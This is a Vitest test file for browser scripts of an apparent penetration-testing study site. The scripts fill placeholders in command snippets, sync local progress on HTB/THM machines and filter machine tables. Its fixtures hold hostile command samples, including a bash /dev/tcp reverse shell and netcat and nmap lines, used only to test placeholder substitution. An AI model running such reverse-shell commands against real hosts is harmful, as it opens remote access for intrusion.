// @vitest-environment jsdom
import { readFileSync } from 'node:fs';
import { beforeEach, describe, it, expect } from 'vitest';

const varsBarSrc = readFileSync('public/vars-bar.js', 'utf8');
const copyCodeSrc = readFileSync('public/copy-code.js', 'utf8');
const localProgressSrc = readFileSync('public/local-progress.js', 'utf8');
const tableFilterSrc = readFileSync('public/table-filter.js', 'utf8');

const runScript = (code: string) => new Function('module', code)({ exports: {} });

describe('vars-bar.js and copy-code.js', () => {
  beforeEach(() => {
    localStorage.clear();
    document.body.innerHTML = '';
  });

  it('does nothing when code blocks contain no placeholders', () => {
    document.body.innerHTML = '<main id="main"><h2>Commands</h2><pre><code>whoami -all</code></pre></main>';
    runScript(varsBarSrc);
    expect(document.getElementById('zb-vars-bar')).toBeNull();
  });

  it('injects labelled inputs, syncs globalVars, persists Clear values across reload, and preserves data-template in any script order', () => {
    localStorage.setItem(
      'zerobox-tactical-store',
      JSON.stringify({
        state: {
          currentProfileId: 'guest',
          globalVars: { targetIp: '10.10.x.x', lhost: '10.10.14.x', lport: '4444', domain: 'target.htb' },
        },
      })
    );
    document.body.innerHTML =
      '<main id="main"><h2>Recon</h2><pre><code>nmap -sV {TARGET_IP} &amp;&amp; nc {LHOST} {LPORT}</code></pre></main>';
    runScript(varsBarSrc);
    const bar = document.getElementById('zb-vars-bar');
    expect(bar).not.toBeNull();

    const targetIn = document.getElementById('vb-target') as HTMLInputElement;
    const lhostIn = document.getElementById('vb-lhost') as HTMLInputElement;
    const lportIn = document.getElementById('vb-lport') as HTMLInputElement;
    expect(document.querySelector('label[for="vb-target"]')?.textContent).toBe('TARGET_IP');

    targetIn.value = '10.10.11.42';
    targetIn.dispatchEvent(new Event('input', { bubbles: true }));
    lhostIn.value = '10.10.14.9';
    lhostIn.dispatchEvent(new Event('input', { bubbles: true }));
    lportIn.value = '9001';
    lportIn.dispatchEvent(new Event('input', { bubbles: true }));

    // Even if copy-code.js runs after vars-bar.js already substituted text, data-template stays intact
    runScript(copyCodeSrc);

    const code = document.querySelector('pre code')!;
    expect(code.textContent).toBe('nmap -sV 10.10.11.42 && nc 10.10.14.9 9001');
    expect(JSON.parse(localStorage.getItem('zerobox-static-vars') || '{}')).toMatchObject({
      targetIp: '10.10.11.42',
      lhost: '10.10.14.9',
      lport: '9001',
    });
    expect(JSON.parse(localStorage.getItem('zerobox-tactical-store') || '{}').state.globalVars).toMatchObject({
      targetIp: '10.10.11.42',
      lhost: '10.10.14.9',
      lport: '9001',
    });

    const reset = bar!.querySelector('button') as HTMLButtonElement;
    reset.click();
    expect(code.textContent).toBe('nmap -sV {TARGET_IP} && nc {LHOST} {LPORT}');

    // Reloading the page after Clear values stays cleared (does not resurrect from zerobox-tactical-store)
    document.body.innerHTML =
      '<main id="main"><h2>Recon</h2><pre><code>nmap -sV {TARGET_IP} &amp;&amp; nc {LHOST} {LPORT}</code></pre></main>';
    runScript(varsBarSrc);
    expect((document.getElementById('vb-target') as HTMLInputElement).value).toBe('');
    expect(document.querySelector('pre code')?.textContent).toBe('nmap -sV {TARGET_IP} && nc {LHOST} {LPORT}');
  });

  it('syncs /revshells/ #rs-lhost and #rs-lport two-way with SPA globalVars', () => {
    localStorage.setItem(
      'zerobox-tactical-store',
      JSON.stringify({
        state: {
          currentProfileId: 'guest',
          globalVars: { targetIp: '10.10.x.x', lhost: '10.10.14.77', lport: '9002' },
        },
      })
    );
    document.body.innerHTML = `<main id="main">
      <div id="rs-fill" hidden>
        <input id="rs-lhost" value="" />
        <input id="rs-lport" value="" />
      </div>
      <pre><code>bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1</code></pre>
    </main>`;

    runScript(copyCodeSrc);
    const lhost = document.getElementById('rs-lhost') as HTMLInputElement;
    const lport = document.getElementById('rs-lport') as HTMLInputElement;
    expect(lhost.value).toBe('10.10.14.77');
    expect(lport.value).toBe('9002');
    expect(document.querySelector('pre code')?.textContent).toBe('bash -i >& /dev/tcp/10.10.14.77/9002 0>&1');

    lhost.value = '10.10.14.88';
    lhost.dispatchEvent(new Event('input', { bubbles: true }));
    expect(JSON.parse(localStorage.getItem('zerobox-tactical-store') || '{}').state.globalVars.lhost).toBe('10.10.14.88');
  });
});

describe('local-progress.js', () => {
  beforeEach(() => {
    localStorage.clear();
    document.body.innerHTML = `<main id="main">
      <table class="list"><tbody>
        <tr data-name="Lame" data-platform="HTB"><td><a href="/machines/htb-lame/">Lame</a></td><td>HTB</td></tr>
        <tr data-name="Blue" data-platform="HTB"><td><a href="/machines/htb-blue/">Blue</a></td><td>HTB</td></tr>
        <tr data-name="Blue" data-platform="THM"><td><a href="https://tryhackme.com/room/blue">Blue</a></td><td>THM</td></tr>
      </tbody></table>
    </main>`;
  });

  it('leaves the DOM completely untouched when no local progress exists', () => {
    runScript(localProgressSrc);
    expect(document.querySelector('.lp-summary')).toBeNull();
    expect(document.querySelectorAll('[data-local-solved]')).toHaveLength(0);
  });

  it('reads real zerobox_operator_profile_<id>, strictly isolates cross-platform namesakes, and ignores inactive profiles', () => {
    localStorage.setItem(
      'zerobox-tactical-store',
      JSON.stringify({ state: { currentProfileId: 'guest' } })
    );
    localStorage.setItem(
      'zerobox_operator_profile_guest',
      JSON.stringify({
        machines: [
          { id: 'htb-blue', name: 'Blue', platform: 'HTB', status: 'completed' },
        ],
      })
    );
    localStorage.setItem(
      'zerobox_operator_profile_other',
      JSON.stringify({
        machines: [
          { id: 'htb-lame', name: 'Lame', platform: 'HTB', status: 'root' },
        ],
      })
    );

    runScript(localProgressSrc);
    expect(document.querySelector('.lp-summary')?.textContent).toBe('Solved in your browser: 1 of 3 on this page.');
    const solvedRows = document.querySelectorAll('tr[data-local-solved="true"]');
    expect(solvedRows).toHaveLength(1);
    expect(solvedRows[0].getAttribute('data-platform')).toBe('HTB');
    expect(solvedRows[0].getAttribute('data-name')).toBe('Blue');
  });
});

describe('table-filter.js URL sync and / shortcut', () => {
  beforeEach(() => {
    history.replaceState(null, '', '/oscp-like-machines/');
    document.body.innerHTML = `<main id="main"><h1>OSCP</h1>
      <h2>List</h2>
      <table class="list"><thead><tr><th>Machine</th></tr></thead><tbody>
        <tr data-name="Lame" data-os="Linux" data-difficulty="Easy" data-platform="HTB" data-tags="Samba"><td>Lame</td></tr>
        <tr data-name="Blue" data-os="Windows" data-difficulty="Easy" data-platform="HTB" data-tags="SMB"><td>Blue</td></tr>
      </tbody></table>
    </main>`;
    runScript(tableFilterSrc);
  });

  it('syncs OS filter to location.search and restores clean pathname on Reset', () => {
    const osSelect = document.getElementById('tf-os') as HTMLSelectElement;
    osSelect.value = 'Windows';
    osSelect.dispatchEvent(new Event('change', { bubbles: true }));
    expect(location.search).toBe('?os=Windows');

    (document.querySelector('.tf-reset') as HTMLButtonElement).click();
    expect(location.search).toBe('');
    expect(location.pathname).toBe('/oscp-like-machines/');
  });

  it('focuses search on / key when outside inputs', () => {
    const search = document.getElementById('tf-q') as HTMLInputElement;
    expect(document.activeElement).not.toBe(search);
    document.dispatchEvent(new KeyboardEvent('keydown', { key: '/', bubbles: true, cancelable: true }));
    expect(document.activeElement).toBe(search);
  });
});
